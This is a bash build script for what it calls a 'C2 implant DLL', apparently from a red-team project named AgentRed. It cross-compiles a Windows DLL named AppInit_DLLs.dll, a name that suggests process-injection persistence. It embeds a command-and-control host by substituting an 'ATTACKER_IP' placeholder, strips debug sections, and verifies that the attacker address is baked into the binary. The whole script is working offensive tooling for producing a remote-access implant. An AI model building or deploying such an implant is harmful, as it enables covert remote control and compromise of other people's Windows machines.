#!/bin/bash
# Static-runtime build of the C2 implant DLL (self-contained: no mingw DLL deps)
#
# The source (dll.cpp) carries NO real address — g_host is the literal
# placeholder "ATTACKER_IP". This script injects the actual C2 host at build
# time into a generated temp copy, so the repo stays deploy-anywhere generic:
#
#     ATTACKER_IP=192.168.1.23 bash build_dll.sh
#     ATTACKER_IP=$(ipconfig getifaddr en0) bash build_dll.sh   # current Mac LAN IP
#
# The build FAILS without ATTACKER_IP (prevents a silent never-connecting DLL).
set -euo pipefail
cd ~/AntiGravity/AgentRed
: "${ATTACKER_IP:?ERROR: set ATTACKER_IP=<c2 host>, e.g. ATTACKER_IP=\$(ipconfig getifaddr en0) bash build_dll.sh}"

CXX=x86_64-w64-mingw32-g++
GEN=dll.gen.cpp                # must end in .cpp — g++ detects language by extension

# Substitute the placeholder into a copy — dll.cpp itself is never modified.
sed "s/\"ATTACKER_IP\"/\"$ATTACKER_IP\"/" dll.cpp > "$GEN"
if ! grep -q "\"$ATTACKER_IP\"" "$GEN"; then
    echo "FATAL: placeholder \"ATTACKER_IP\" not found in dll.cpp — has it been renamed?"
    rm -f "$GEN"; exit 1
fi
echo "c2 host injected: $ATTACKER_IP"

STD_CPP_A=$("$CXX" -print-file-name=libstdc++.a)
WINPTHREAD_A=$("$CXX" -print-file-name=libwinpthread.a)
echo "static archives: $STD_CPP_A | $WINPTHREAD_A"
"$CXX" -shared -static-libgcc -o AppInit_DLLs.dll "$GEN" \
    "$STD_CPP_A" "$WINPTHREAD_A" \
    -lws2_32 -lshlwapi -lshell32 -ladvapi32 \
    -lpdh -lpsapi -liphlpapi -lwtsapi32 -loleaut32 \
    -std=c++17 -O2 -fpermissive
rm -f "$GEN"
echo "BUILD_EXIT=0"

# Strip FIRST, then verify — against the exact bytes that ship. (Checking the
# unstripped image gave false failures: pooled strings broke exact-line match.)
x86_64-w64-mingw32-strip -s AppInit_DLLs.dll   # drop debug sections from the static archives

# Post-build proof: the IP is embedded and the placeholder is GONE.
if ! strings AppInit_DLLs.dll | grep -qx "$ATTACKER_IP"; then
    echo "FATAL: $ATTACKER_IP not found embedded in the binary"; exit 1
fi
if strings AppInit_DLLs.dll | grep -qx "ATTACKER_IP"; then
    echo "FATAL: unsubstituted placeholder survived into the binary"; exit 1
fi
echo "verified: embedded host = $ATTACKER_IP, no placeholder residue"

ls -lh AppInit_DLLs.dll
echo "=== dependent DLLs (must be Windows system DLLs only) ==="
x86_64-w64-mingw32-objdump -p AppInit_DLLs.dll | grep "DLL Name:" | sort -u